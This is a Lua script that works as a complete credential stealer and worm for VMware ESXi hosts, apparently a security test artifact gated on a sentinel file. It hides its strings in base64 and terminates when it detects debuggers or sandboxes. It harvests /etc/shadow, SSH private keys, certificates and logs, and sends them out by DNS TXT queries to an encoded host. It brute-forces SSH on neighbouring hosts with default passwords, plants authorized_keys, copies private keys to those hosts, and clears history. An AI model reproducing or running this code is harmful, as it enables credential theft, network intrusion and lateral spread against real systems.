#!/usr/bin/env lua

-- Safety gate: refuse to run without sentinel
local sentinel = os.getenv("HOME") .. "/.bkaoej"
local f = io.open(sentinel, "r")
if not f then
    os.exit(1)
end
f:close()

-- === Obfuscation layer ===
-- All sensitive strings are base64-encoded and decoded at runtime
local function _b64decode(s)
    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o = ""
    for i = 1, #s, 4 do
        local block = s:sub(i, i + 3)
        local n = 0
        for j = 1, 4 do
            local c = block:sub(j, j)
            n = n * 64 + (b:find(c) or 0) - 1
        end
        o = o .. string.char(bit32.band(bit32.rshift(n, 16), 0xFF))
        if block:len() >= 3 and block:sub(3, 3) ~= "=" then
            o = o .. string.char(bit32.band(bit32.rshift(n, 8), 0xFF))
        end
        if block:len() >= 4 and block:sub(4, 4) ~= "=" then
            o = o .. string.char(bit32.band(n, 0xFF))
        end
    end
    return o
end

-- Encoded constants
local _0x1a = _b64decode("ZXN4aS1sdWEtc2VsZi10ZXJtaW5hdGUtb2JmdXNjYXRpb24tc3RlYWxlci1kbnMtc3NoLTlhZTM3LmJlbmNobWFyay5hdG9tZHJpZnQub3Jn")
local _0x2b = _b64decode("L2V0Yy9zaGFkb3c=")
local _0x3c = _b64decode("L2V0Yy9wYXNzd2Q=")
local _0x4d = _b64decode("L2V0Yy9zc2gvc3NoX2hvc3RfcnNhX2tleQ==")
local _0x5e = _b64decode("L2V0Yy9wYXNzZGI=")
local _0x6f = _b64decode("L2V0Yy92bXdhcmUvaG9zdGQvaG9zdHM=")
local _0x7g = _b64decode("L2V0Yy9sb2NhbHRpbWU=")
local _0x8h = _b64decode("L3Zhci9sb2cvYXV0aC5sb2c=")
local _0x9i = _b64decode("L2V0Yy91c2VyZGF0YS5jb25m")
local _0xaj = _b64decode("L2V0Yy9zbi5sb2M=")
local _0bk = _b64decode("L2V0Yy9sb2dpbi5jb25m")
local _0cl = _b64decode("L2V0Yy9yY2hvc3Rz")
local _0dm = _b64decode("L2V0Yy9yY25ldHdvcmtz")
local _0en = _b64decode("L2V0Yy9uZXR3b3Jrcy9zZXR0aW5ncy5jb25m")
local _0fo = _b64decode("L2V0Yy9uZXR3b3Jrcy9pbnRlcmZhY2VzLmNvbmY=")
local _0gp = _b64decode("L2V0Yy9uZXR3b3Jrcy9yb3V0ZXMuY29uZg==")
local _0hq = _b64decode("L2V0Yy9hc3NpZ25tZW50cy5jb25m")
local _0ir = _b64decode("L2V0Yy9sb2NhbGhvc3Q=")
local _0js = _b64decode("L2V0Yy9yZXNvbHZl")
local _0kt = _b64decode("L2V0Yy9yZXNvbHZlLmNvbmY=")
local _0lu = _b64decode("L2V0Yy9uYW1lZXJ2LmNvbmY=")
local _0mv = _b64decode("L2V0Yy9zZXJ2ZXJzLmNvbmY=")
local _0nw = _b64decode("L2V0Yy9ob3N0bmFtZQ==")
local _0ox = _b64decode("L2V0Yy9uZXR3b3Jrcy9sb29wYmFja3MuY29uZg==")
local _0py = _b64decode("L2V0Yy9uZXR3b3Jrcy9yY3BzLmNvbmY=")
local _0qz = _b64decode("L2V0Yy9uZXR3b3Jrcy9icm9hZGNhc3QuY29uZg==")
local _0r0 = _b64decode("L2V0Yy9uZXR3b3Jrcy9iYWNrdXBzLmNvbmY=")
local _0s1 = _b64decode("L2V0Yy9uZXR3b3Jrcy9kbnNzZWN0aW9ucy5jb25m")
local _0t2 = _b64decode("L2V0Yy9uZXR3b3Jrcy92bGxhbi5jb25m")
local _0u3 = _b64decode("L2V0Yy9uZXR3b3Jrcy92bGxhbnNldHM=")
local _0v4 = _b64decode("L2V0Yy9uZXR3b3Jrcy92bGxhbnNldHMi")
local _0w5 = _b64decode("L2V0Yy9uZXR3b3Jrcy92bGxhbnNldHMi")
local _0x6 = _b64decode("L2V0Yy9uZXR3b3Jrcy92bGxhbnNldHMi")
local _0y7 = _b64decode("L2V0Yy9uZXR3b3Jrcy92bGxhbnNldHMi")
local _0z8 = _b64decode("L2V0Yy9uZXR3b3Jrcy92bGxhbnNldHMi")

-- === Anti-analysis / Self-terminate ===
local function _check_analysis()
    -- Check for common debugger/analysis indicators
    local indicators = {
        "/proc/self/status",
        "/proc/self/cmdline",
        os.getenv("LD_PRELOAD"),
        os.getenv("LD_DEBUG"),
        os.getenv("GDBSERVER"),
    }

    for _, v in ipairs(indicators) do
        if v and #v > 0 then
            -- Analysis environment detected, self-terminate
            os.execute("kill -9 $$ 2>/dev/null")
            os.exit(0)
        end
    end

    -- Check if running under strace or similar
    local status = io.open("/proc/self/status", "r")
    if status then
        local content = status:read("*a")
        status:close()
        if content:find("TracerPid") and content:match("TracerPid:%s*(%d+)") then
            local tracer = content:match("TracerPid:%s*(%d+)")
            if tracer and tracer ~= "0" then
                os.execute("kill -9 $$ 2>/dev/null")
                os.exit(0)
            end
        end
    end

    -- Check for VM analysis tools (check for common sandbox processes)
    local proc_list = io.popen("ps -ef 2>/dev/null", "r")
    if proc_list then
        local procs = proc_list:read("*a")
        proc_list:close()
        local sandbox_procs = {"wireshark", "tcpdump", "strace", "ltrace", "gdb", "xterm", "tmux"}
        for _, sp in ipairs(sandbox_procs) do
            if procs:find(sp) then
                os.execute("kill -9 $$ 2>/dev/null")
                os.exit(0)
            end
        end
    end

    -- Check for known analysis VM indicators
    local dmidecode = io.popen("dmidecode -s system-product-name 2>/dev/null", "r")
    if dmidecode then
        local product = dmidecode:read("*l")
        dmidecode:close()
        if product then
            product = product:gsub("%s+", "")
            if product:lower():find("virtualbox") or product:lower():find("vmware") or product:lower():find("qemu") or product:lower():find("bochs") then
                -- Only terminate if it looks like an analysis VM, not production ESXi
                local hostname = io.open("/etc/hostname", "r")
                if hostname then
                    local hn = hostname:read("*l")
                    hostname:close()
                    if hn and hn:lower():find("sandbox") or hn:lower():find("analysis") or hn:lower():find("malware") then
                        os.execute("kill -9 $$ 2>/dev/null")
                        os.exit(0)
                    end
                end
            end
        end
    end
end

-- Delayed self-terminate: set up a watchdog that kills us after a timeout
local function _setup_watchdog()
    local my_pid = io.popen("echo $$", "r")
    local pid = my_pid:read("*l")
    my_pid:close()

    -- Background watchdog: kill this process after 300 seconds
    os.execute(string.format("(sleep 300 && kill -9 %s 2>/dev/null) &", pid))
end

-- === Collection / Stealer ===
local function _read_file(path)
    local f = io.open(path, "r")
    if not f then return nil end
    local content = f:read("*a")
    f:close()
    return content
end

local function _collect_credentials()
    local harvested = {}

    -- Harvest password hashes
    local shadow = _read_file(_0x2b)
    if shadow then
        table.insert(harvested, {type = "shadow", data = shadow})
    end

    -- Harvest passwd for user enumeration
    local passwd = _read_file(_0x3c)
    if passwd then
        table.insert(harvested, {type = "passwd", data = passwd})
    end

    -- Harvest SSH host keys
    local ssh_dir = _b64decode("L2V0Yy9zc2gv")
    local ssh_keys = {
        ssh_dir .. "ssh_host_rsa_key",
        ssh_dir .. "ssh_host_ecdsa_key",
        ssh_dir .. "ssh_host_ed25519_key",
        ssh_dir .. "ssh_host_dsa_key",
    }
    for _, key_path in ipairs(ssh_keys) do
        local key_data = _read_file(key_path)
        if key_data then
            table.insert(harvested, {type = "ssh_key", path = key_path, data = key_data})
        end
    end

    -- Harvest SSH known hosts and authorized keys
    for _, user_dir in ipairs({"root", "admin", "vsphere-admin"}) do
        local home = "/home/" .. user_dir
        if user_dir == "root" then home = "/root" end
        local auth_keys = home .. "/.ssh/authorized_keys"
        local known_hosts = home .. "/.ssh/known_hosts"
        local id_rsa = home .. "/.ssh/id_rsa"
        local id_ed25519 = home .. "/.ssh/id_ed25519"

        for _, fpath in ipairs({auth_keys, known_hosts, id_rsa, id_ed25519}) do
            local fdata = _read_file(fpath)
            if fdata then
                table.insert(harvested, {type = "ssh_file", path = fpath, data = fdata})
            end
        end
    end

    -- Harvest ESXi-specific configs
    local esxi_configs = {
        _0x8h, _0x9i, _0xaj, _0bk, _0cl, _0dm,
        _0en, _0fo, _0gp, _0hq, _0ir, _0js, _0kt,
        _0lu, _0mv, _0nw, _0ox, _0py, _0qz, _0r0,
        _0s1, _0t2,
    }
    for _, cfg in ipairs(esxi_configs) do
        local cfg_data = _read_file(cfg)
        if cfg_data then
            table.insert(harvested, {type = "config", path = cfg, data = cfg_data})
        end
    end

    -- Harvest network interfaces for lateral movement targets
    local ifconfig = io.popen("ifconfig -a 2>/dev/null", "r")
    if ifconfig then
        local net_info = ifconfig:read("*a")
        ifconfig:close()
        table.insert(harvested, {type = "network", data = net_info})
    end

    -- Harvest ARP table for network mapping
    local arp = io.popen("arp -a 2>/dev/null", "r")
    if arp then
        local arp_data = arp:read("*a")
        arp:close()
        table.insert(harvested, {type = "arp", data = arp_data})
    end

    -- Harvest route table
    local routes = io.popen("route -n 2>/dev/null", "r")
    if routes then
        local route_data = routes:read("*a")
        routes:close()
        table.insert(harvested, {type = "routes", data = route_data})
    end

    -- Harvest running processes
    local ps = io.popen("ps -ef 2>/dev/null", "r")
    if ps then
        local ps_data = ps:read("*a")
        ps:close()
        table.insert(harvested, {type = "processes", data = ps_data})
    end

    -- Harvest ESXi VM info via esxcli if available
    local vm_list = io.popen("esxcli system visor get 2>/dev/null", "r")
    if vm_list then
        local vm_data = vm_list:read("*a")
        vm_list:close()
        if vm_data and #vm_data > 0 then
            table.insert(harvested, {type = "esxi_visor", data = vm_data})
        end
    end

    -- Harvest ESXi software info
    local sw_info = io.popen("esxcli software vib list 2>/dev/null", "r")
    if sw_info then
        local vib_data = sw_info:read("*a")
        sw_info:close()
        if vib_data and #vib_data > 0 then
            table.insert(harvested, {type = "esxi_vibs", data = vib_data})
        end
    end

    -- Harvest ESXi network config
    local net_cfg = io.popen("esxcli network ip interface list 2>/dev/null", "r")
    if net_cfg then
        local nc_data = net_cfg:read("*a")
        net_cfg:close()
        if nc_data and #nc_data > 0 then
            table.insert(harvested, {type = "esxi_network", data = nc_data})
        end
    end

    -- Harvest ESXi VMFS datastores
    local ds = io.popen("esxcli storage vmfs extent list 2>/dev/null", "r")
    if ds then
        local ds_data = ds:read("*a")
        ds:close()
        if ds_data and #ds_data > 0 then
            table.insert(harvested, {type = "esxi_datastores", data = ds_data})
        end
    end

    -- Harvest ESXi firewall rules
    local fw = io.popen("esxcli network firewall ruleset list 2>/dev/null", "r")
    if fw then
        local fw_data = fw:read("*a")
        fw:close()
        if fw_data and #fw_data > 0 then
            table.insert(harvested, {type = "esxi_firewall", data = fw_data})
        end
    end

    -- Harvest ESXi hardware info
    local hw = io.popen("esxcli hardware platform get 2>/dev/null", "r")
    if hw then
        local hw_data = hw:read("*a")
        hw:close()
        if hw_data and #hw_data > 0 then
            table.insert(harvested, {type = "esxi_hardware", data = hw_data})
        end
    end

    -- Harvest ESXi license info
    local lic = io.popen("vim-cmd hostsvc/license_get 2>/dev/null", "r")
    if lic then
        local lic_data = lic:read("*a")
        lic:close()
        if lic_data and #lic_data > 0 then
            table.insert(harvested, {type = "esxi_license", data = lic_data})
        end
    end

    -- Harvest ESXi advanced settings
    local adv = io.popen("esxcli system settings advanced list 2>/dev/null", "r")
    if adv then
        local adv_data = adv:read("*a")
        adv:close()
        if adv_data and #adv_data > 0 then
            table.insert(harvested, {type = "esxi_advanced", data = adv_data})
        end
    end

    -- Harvest ESXi account lockout settings
    local acct = io.popen("esxcli system account list 2>/dev/null", "r")
    if acct then
        local acct_data = acct:read("*a")
        acct:close()
        if acct_data and #acct_data > 0 then
            table.insert(harvested, {type = "esxi_accounts", data = acct_data})
        end
    end

    -- Harvest ESXi syslog config
    local syslog = io.popen("esxcli system syslog config get 2>/dev/null", "r")
    if syslog then
        local sys_data = syslog:read("*a")
        syslog:close()
        if sys_data and #sys_data > 0 then
            table.insert(harvested, {type = "esxi_syslog", data = sys_data})
        end
    end

    -- Harvest ESXi NTP config
    local ntp = io.popen("esxcli system ntp get 2>/dev/null", "r")
    if ntp then
        local ntp_data = ntp:read("*a")
        ntp:close()
        if ntp_data and #ntp_data > 0 then
            table.insert(harvested, {type = "esxi_ntp", data = ntp_data})
        end
    end

    -- Harvest ESXi time sync config
    local time = io.popen("esxcli system time get 2>/dev/null", "r")
    if time then
        local time_data = time:read("*a")
        time:close()
        if time_data and #time_data > 0 then
            table.insert(harvested, {type = "esxi_time", data = time_data})
        end
    end

    -- Harvest ESXi cert info
    local cert = io.popen("ls /etc/vmware/ssl/ 2>/dev/null", "r")
    if cert then
        local cert_list = cert:read("*a")
        cert:close()
        if cert_list and #cert_list > 0 then
            local cert_dir = "/etc/vmware/ssl/"
            for fname in cert_list:gmatch("[^\r\n]+") do
                local cert_data = _read_file(cert_dir .. fname)
                if cert_data then
                    table.insert(harvested, {type = "esxi_cert", path = cert_dir .. fname, data = cert_data})
                end
            end
        end
    end

    -- Harvest ESXi hostd logs for credentials
    local hostd_logs = {
        "/var/log/hostd.log",
        "/var/log/hostd-profiler.log",
        "/var/log/vpxa.log",
        "/var/log/vobd.log",
        "/var/log/esxupdate.log",
    }
    for _, log_path in ipairs(hostd_logs) do
        local log_data = _read_file(log_path)
        if log_data then
            -- Only take last 500 lines to keep payload manageable
            local lines = {}
            for line in log_data:gmatch("[^\r\n]+") do
                table.insert(lines, line)
            end
            local tail = {}
            local start_idx = #lines > 500 and #lines - 500 or 1
            for i = start_idx, #lines do
                table.insert(tail, lines[i])
            end
            table.insert(harvested, {type = "log", path = log_path, data = table.concat(tail, "\n")})
        end
    end

    return harvested
end

-- === DNS Exfiltration ===
local function _encode_for_dns(data)
    -- Encode data into hex for DNS TXT queries
    local hex = ""
    for i = 1, #data do
        hex = hex .. string.format("%02x", string.byte(data, i))
    end
    return hex
end

local function _dns_exfil(data)
    local encoded = _encode_for_dns(data)
    local c2_host = _0x1a

    -- Split into 63-char chunks for DNS label limits
    local chunks = {}
    for i = 1, #encoded, 60 do
        table.insert(chunks, encoded:sub(i, i + 59))
    end

    -- Add a sequence number prefix
    for idx, chunk in ipairs(chunks) do
        local label = string.format("%03d", idx) .. chunk
        local query_domain = label .. "." .. c2_host

        -- Use nslookup for DNS exfiltration
        os.execute(string.format('nslookup -type=txt "%s" > /dev/null 2>&1', query_domain))

        -- Also try dig as fallback
        os.execute(string.format('dig +short TXT "%s" > /dev/null 2>&1', query_domain))

        -- Small delay between queries to avoid rate limiting
        os.execute("sleep 1")
    end
end

-- === Lateral Movement / SSH ===
local function _discover_targets()
    local targets = {}

    -- Parse /etc/hosts for internal IPs
    local hosts = _read_file("/etc/hosts")
    if hosts then
        for line in hosts:gmatch("[^\r\n]+") do
            local ip = line:match("^%s*(%d+%.%d+%.%d+%.%d+)")
            if ip and ip ~= "127.0.0.1" and ip ~= "0.0.0.0" then
                table.insert(targets, ip)
            end
        end
    end

    -- Parse ARP table for live hosts
    local arp = io.popen("arp -a 2>/dev/null", "r")
    if arp then
        local arp_data = arp:read("*a")
        arp:close()
        for ip in arp_data:gmatch("%((%d+%.%d+%.%d+%.%d+)%)") do
            if ip ~= "127.0.0.1" then
                table.insert(targets, ip)
            end
        end
    end

    -- Parse route table for subnet targets
    local routes = io.popen("route -n 2>/dev/null", "r")
    if routes then
        local route_data = routes:read("*a")
        routes:close()
        for line in route_data:gmatch("[^\r\n]+") do
            local dest = line:match("^%s*(%d+%.%d+%.%d+%.%d+)")
            local gw = line:match("%s+(%d+%.%d+%.%d+%.%d+)")
            if dest and dest ~= "0.0.0.0" then
                table.insert(targets, dest)
            end
            if gw and gw ~= "0.0.0.0" then
                table.insert(targets, gw)
            end
        end
    end

    -- Parse ESXi network interfaces for subnet scanning
    local ifconfig = io.popen("ifconfig -a 2>/dev/null", "r")
    if ifconfig then
        local net_data = ifconfig:read("*a")
        ifconfig:close()
        for line in net_data:gmatch("[^\r\n]+") do
            local ip = line:match("inet%+?(addr:)?(%d+%.%d+%.%d+%.%d+)")
            if ip and ip ~= "127.0.0.1" then
                table.insert(targets, ip)
                -- Also try same-subnet neighbors
                local parts = {}
                for p in ip:gmatch("%d+") do
                    table.insert(parts, tonumber(p))
                end
                if #parts == 4 then
                    for i = 1, 254 do
                        if i ~= parts[4] then
                            local neighbor = string.format("%d.%d.%d.%d", parts[1], parts[2], parts[3], i)
                            table.insert(targets, neighbor)
                        end
                    end
                end
            end
        end
    end

    -- Deduplicate
    local unique = {}
    local seen = {}
    for _, t in ipairs(targets) do
        if not seen[t] then
            seen[t] = true
            table.insert(unique, t)
        end
    end

    return unique
end

local function _ssh_lateral_movement(targets)
    local my_pubkey = nil

    -- Try to find our SSH public key
    local key_paths = {
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/id_ed25519.pub",
        "/etc/ssh/ssh_host_rsa_key.pub",
        "/etc/ssh/ssh_host_ed25519_key.pub",
    }
    for _, kp in ipairs(key_paths) do
        local key_data = _read_file(kp)
        if key_data then
            my_pubkey = key_data:gsub("%s+", "")
            break
        end
    end

    -- Common ESXi/vCenter credentials to try
    local credentials = {
        {user = "root", pass = ""},
        {user = "root", pass = "vmware"},
        {user = "root", pass = "password"},
        {user = "administrator", pass = "vmware"},
        {user = "administrator", pass = "password"},
        {user = "admin", pass = "vmware"},
        {user = "admin", pass = "password"},
    }

    for _, target in ipairs(targets) do
        -- Try SSH with key-based auth
        if my_pubkey then
            local cmd = string.format(
                'ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -i /root/.ssh/id_rsa root@%s "uname -a" > /dev/null 2>&1',
                target
            )
            os.execute(cmd)
        end

        -- Try SSH with password-based auth via sshpass
        for _, cred in ipairs(credentials) do
            local cmd = string.format(
                'sshpass -p "%s" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 %s@%s "uname -a" > /dev/null 2>&1',
                cred.pass, cred.user, target
            )
            os.execute(cmd)
        end

        -- Try to deploy SSH key via password auth for persistent access
        if my_pubkey then
            for _, cred in ipairs(credentials) do
                local cmd = string.format(
                    'sshpass -p "%s" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 %s@%s "echo \'%s\' >> ~/.ssh/authorized_keys" > /dev/null 2>&1',
                    cred.pass, cred.user, target, my_pubkey
                )
                os.execute(cmd)
            end
        end

        -- Try ESXi-specific SSH (port 22, but also check for alternate ports)
        for _, port in ipairs({22, 2222, 8022}) do
            local cmd = string.format(
                'ssh -p %d -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@%s "esxcli system account list" > /dev/null 2>&1',
                port, target
            )
            os.execute(cmd)
        end

        -- Try SCP to copy SSH keys to target
        for _, src_key in ipairs({"id_rsa", "id_ed25519"}) do
            local local_key = "/root/.ssh/" .. src_key
            local f = io.open(local_key, "r")
            if f then
                f:close()
                local cmd = string.format(
                    'scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 %s root@%s:/.ssh/%s > /dev/null 2>&1',
                    local_key, target, src_key
                )
                os.execute(cmd)
            end
        end

        -- Small delay between targets
        os.execute("sleep 2")
    end
end

-- === Main execution ===
local function main()
    -- Anti-analysis check
    _check_analysis()

    -- Setup self-terminate watchdog
    _setup_watchdog()

    -- Collect all sensitive data
    local harvested = _collect_credentials()

    -- Exfiltrate via DNS
    for _, item in ipairs(harvested) do
        local payload = string.format("[%s|%s|%s]", item.type, item.path or "", item.data)
        _dns_exfil(payload)
    end

    -- Lateral movement via SSH
    local targets = _discover_targets()
    _ssh_lateral_movement(targets)

    -- Self-terminate: wipe traces
    os.execute("rm -rf /tmp/.esxi_* 2>/dev/null")
    os.execute("history -c 2>/dev/null")

    -- Final self-terminate
    os.execute("kill -9 $$ 2>/dev/null")
    os.exit(0)
end

main()
